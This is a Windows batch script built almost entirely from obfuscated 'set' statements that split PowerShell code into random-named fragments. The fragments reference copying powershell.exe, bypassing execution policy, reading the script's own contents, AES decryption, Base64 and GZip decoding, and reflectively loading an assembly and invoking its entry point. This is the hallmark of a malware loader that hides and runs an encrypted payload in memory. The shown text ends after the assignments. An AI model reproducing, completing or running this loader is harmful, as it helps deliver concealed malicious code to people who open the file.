@echo off
set "sldusyICiF=po"
set "ZfdsGybpdx=rs"
set "noBDqmiuzm=Po"
set "OLVCtXdMGA=ow"
set "krJHktbhMI=ws"
set "rPaCHgcJke=py"
set "ktLnWhKsGw=:\"
set "jUzszBfnMR=1."
set "UqRQrdvXkr=do"
set "PoixCAFMDE=\v"
set "VbyXYesQjA=ll"
set "pfpylLCzkY= C"
set "DiltWniLOT=.e"
set "SJrKUcKBLZ=y "
set "wJdOpLHVpr=s\"
set "wtyLtehcIY=xe"
set "HjveeGZPtv=nd"
set "MQaKfGPnAf=he"
set "YdzbbrSrls=32"
set "PExuiTrfGG=Wi"
set "jxfxDvZWBO= /"
set "awDqsBKSgl=\W"
set "QFyfkXgHPs=em"
set "hUZlIdIVak=st"
set "adKVVaCfyw=we"
set "uxSDqbXHjq=Sy"
set "lVVHmXReZb=he"
set "sfYSxJENZp=we"
set "LpnEhqkfBE=co"
set "gMIPaLcnUh=rS"
set "TDfhQRGrXt=ll"
set "UqmTtfoKQV=0\"
set "cMVfBOYMts=in"
set "dsUMLKncqz= %~dp0"
set "mZQgZdWOkI=cd"
set "rRIyqLVMYV=-1.."
set "prNvyaiTOh=pStr"
set "XcNOyaWfZy= '')"
set "YPQzmevfKP=Yz.D"
set "IjHhZHIIkg=ptog"
set "OPhJqNPKMc=e = "
set "SUYNynjDOu=1] -"
set "smYJmOggZI=O.Me"
set "SHevpgOnbM=zk ="
set "nEyCkkZdXO=morF"
set "sIgyokByOs=ion."
set "jRJPNXGKei=pose"
set "WsEDAZVRgO=Disp"
set "XHUvmIVsro=);$a"
set "asbzIYtOSU=ddin"
set "tTtSpswsbj=.Mod"
set "UkGlAhBSLs=[Sys"
set "yCWSNtlDkp=ay()"
set "jQJjwXRTrx=th('"
set "QuPTunqFPB=NYI."
set "oNqXvvsXcT=ode]"
set "CUWvXiCOWJ=Gju."
set "KHNcZjHcWe=trea"
set "fGXWvBHNfc=g = "
set "VUvnRueXiG=oin "
set "EnMZQCBgVl='[-1"
set "LiAsSgrhqZ=eZVH"
set "yGviLKqJDT=yste"
set "nUuNklSwwl=).Sp"
set "REGJvDbzbh=.Cry"
set "gQrKmmZeQN=.Con"
set "mmYITMpwGA=[IO."
set "cyWGFpEXov=ress"
set "VLcpXcNcaN=3); "
set "qJlGcWBrCd=[]] "
set "SVVIMOsVgQ= = $"
set "dYtNnPkwsw=rLHk"
set "PdeaEkkCVZ=n ''"
set "BkLkuSYlVz=tsWi"
set "PQaJsWcuIh=ewLi"
set "keBnWQUEUy=);$a"
set "JmIMaYTqdg=ptor"
set "vGBkMfMdyb=k; }"
set "qRIUvLRvxj=7Yiv"
set "hnBXauoOGQ=Secu"
set "qiaePETfuc=VHH."
set "pWNKmTiMRb=tryP"
set "hOSATlfMzK=;$dk"
set "efLVvLJcQb=vj0m"
set "WjbaEaSlXc=ring"
set "cbAtPWZXZd=rofi"
set "aqjSUhAaJb=($rL"
set "GwyYRHBRZm=;$Jr"
set "LNqJaYKOgv=yTo("
set "yDLlfIlxMi=bjec"
set "kVPjNWLXJw=U.Pa"
set "ZpnIxfmEcx=pres"
set "CCpCtRNFZq=vert"
set "KZqKWSOOkv=oL'["
set "SUZatJqPox=flec"
set "cSbmKnFXAD=('da"
set "UXksFVXwZH=eoXU"
set "PAXMkhCYnw=oint"
set "NSrNtblTxS=ck($"
set "NLyjuEgbEx=tem."
set "ghsRvpgcbk=ose("
set "ScPKDzPmSv=S46e"
set "eYVINqZnkA=('%*'"
set "MEPnPwXvdN=$wXW"
set "qpfUwxyiiU='[-1"
set "PsTAtbcVxY=$aeo"
set "yIxuiASZax===')"
set "QvFBUAstgz=gMod"
set "QVLGNlnpdB=pDZz"
set "rxuufLcmfx=6esa"
set "qPWMOQArUA=sGUc"
set "pTVRjkYYbw=oArr"
set "eIJpUwZAij=hy.A"
set "IBiIUdDFRo=.Cry"
set "zTVgDwlVJx=TllA"
set "dxjlDXZouz=lBlo"
set "OZXDhnDmVf=HH, "
set "WQxpRiZjRh=e = "
set "ZeJGuhIDGh=..-1"
set "JOIarIbqRE=H = "
set "bpjRwlEbAz=6] -"
set "iYMtdHKeZF=rtS4"
set "CFIDdESpvV=y]::"
set "DaWwjDjPvr=rans"
set "JShitFRbbY=brea"
set "GBmomovqJG=ert]"
set "TJbsTmXSCr=eoXU"
set "BqDhzRYVLO=$eZx"
set "QoMkkbqrWH=Obje"
set "dwdqymZdqn=:: '"
set "CUONGDDjxr= if "
set "ThIOSuTneM=z = "
set "zLfFCzMVZD=eoXU"
set "eGkIrOuNCZ=1..-"
set "ADxtgOdBgS=le  "
set "KLSSNinisi=rity"
set "hQObxKqnHz=.GZi"
set "xOclLdqJYq=em.C"
set "aDzpvjPjIz=.Dis"
set "JdhZmfbXaQ=[Sys"
set "nMWDcCnOIy=yste"
set "bAyjUVniuQ=eZxX"
set "vEbvyLuGHI=fore"
set "jolHXcbjVx=  $A"
set "xYgmfeninn=esFX"
set "BQQgANvGRT=Bmor"
set "QFcUwizhgh=Hke."
set "aFjbELaWbi=ZYYc"
set "xzgIfjAllN=$eZV"
set "LmwenPugCf=e, 0"
set "oXGuFadAwr= = N"
set "QOqVugvAIi=V = "
set "aEKjEdPIlC=]::("
set "eGMuGtiYsI=daeR"
set "wizcnLmupX=.Sec"
set "PtjwjfAmfv=.-16"
set "YVKDcWIMeF=$dkN"
set "RjifZSgqSv=Obje"
set "kPhSIZeAOX=e.Su"
set "uYKCbTtQKp=Syst"
set "aPswCmgVVb=0O+g"
set "KvdQPKAmBw=]::C"
set "KDWLPzmsMV=ke($"
set "tGsSlJDXUT=KYYz"
set "MEWyxrzZui=ach "
set "CAhQEUHQLP=Syst"
set "jfblakiWkl=-ep "
set "rEpcAPYryD=.Ass"
set "SKtruwHIvc=Star"
set "bqimoVXWEP=isfL"
set "sxowfAIYdo=ispo"
set "EwiNvUVhgi=$wXW"
set "cYvQGnyhHW=t Sy"
set "spBdPwHrNV== $a"
set "XzGvWsmXOY=v4Ir"
set "udqmvVuFeB=;$eZ"
set "DSXxYqBYAj=[-1."
set "fXsKEADVhW=Stre"
set "lYYPsqQooQ=rt]:"
set "FDZBWAeCZG=YI.T"
set "KErkQwrrwj=('%~f0'"
set "bvCJqakHoT=7;$a"
set "KUAIGxktxX= [Sy"
set "QYImOvtcVH=Fo7l"
set "GzPozLLiyt=$wXW"
set "TPNizNcFab=onve"
set "DlujBeGMQR=.Cop"
set "XJVDBIEdPk=-4] "
set "SMlVHbTGwl=raph"
set "zXhUeCsBSO=ss -"
set "PHYdcguDcL=ct S"
set "ldnffwDqlo=-joi"
set "aRjvfJyjym=ddin"
set "SkuvdFdSMd==');"
set "MHFRLRZJXq=[Sys"
set "oRXTwEYTOl=Secu"
set "PiimYAXnNE=();$"
set "fdUCXDYQjO=);$w"
set "zUTeiQIvbX=F'[-"
set "ghGcpQuQkG=ne);"
set "OGOnpCfNno=urit"
set "LlerFMnKTh=NM);"
set "kTjrrRnyRr=OyzA"
set "sONzhBeKSg=pher"
set "PcEKJnfMHi=tS46"
set "sIeRwthGKQ=)($A"
set "ldSqeyezWa=ose("
set "izJNfdKRZa=ment"
set "rvvbGfujBq=PElz"
set "sccregZrjb=tem."
set "hWudYNNYrQ=nirt"
set "uImDyxFstR= = ["
set "dvCirxJiEJ=gnir"
set "ZjhgNuuSuH=eZxX"
set "sKujZuHMrO=.Mem"
set "emiizUEBPc=null"
set "GersNQrVga=gth)"
set "RXeSLaguTg=.Key"
set "dDrPusvPRX=$eZx"
set "seaJdpiYkj=ress"
set "twCWMLIFgU=File"
set "GeyxJRokQo=] -j"
set "PrbTwRdZYz=tem."
set "VAEGSWZptE=comm"
set "mrKrMLBqDk=HoN "
set "IwQriucxPq=m.IO"
set "yeARudGgNy=Disp"
set "wWfNgTFVZq=);$J"
set "YcsEXNmljr=m(, "
set "QtqFkCDEgN=eZxX"
set "ypabAkTDyA=oryS"
set "JNlmjjNbJg=join"
set "zCOtWeeeYm= = $"
set "YHugwgqYHH=NM ="
set "wkkASRkysM=mory"
set "oAJvLPkmEh=e = "
set "xxHGvylxfn=3HWs"
set "adRKhgGUnu=grap"
set "oXRGNXKjja=rity"
set "qvBlnKZDOa=m.IO"
set "bOFwiHekdi=NYI "
set "TORvjMmSoG=stem"
set "NcMNxhJDJw=and "
set "ogcYSjqedf=]::N"
set "ekjDcTrava=, $e"
set "MPKuYrPVDI=;$JT"
set "WgoqJeAxZv=NM.T"
set "FOcEiLvnxd=, (,"
set "CwMZuCkhEX=in $"
set "YSiWMgYrxq=.IO."
set "MINObtRWtr=Fina"
set "TibJSNhvJa=e]::"
set "TeEKYzpRBr=Comp"
